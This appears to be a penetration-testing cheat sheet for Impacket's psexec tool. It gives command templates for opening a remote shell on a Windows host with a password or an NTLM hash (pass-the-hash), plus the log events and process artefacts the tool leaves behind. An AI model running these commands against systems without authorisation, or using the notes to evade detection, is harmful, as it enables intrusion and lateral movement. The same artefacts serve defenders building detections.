### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py  

### open shell on remote host
```
impacket-psexec <domain>/<user>:<password>@<rhost>
```

### using hash (hash must be: lmhash:nthash)
```
impacket-psexec -hashes :<ntlmhash> <domain>/<user>@<rhost>
```

### opsec considerations
```
upload randomly named exe file to C:\Windows

Windows Security Log Event IDs
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple

Windows System Logs
-Service Control Manager (7045)
```

### running processes
```
gsHtpykm.exe
└── cmd.exe
    └── Conhost.exe
```

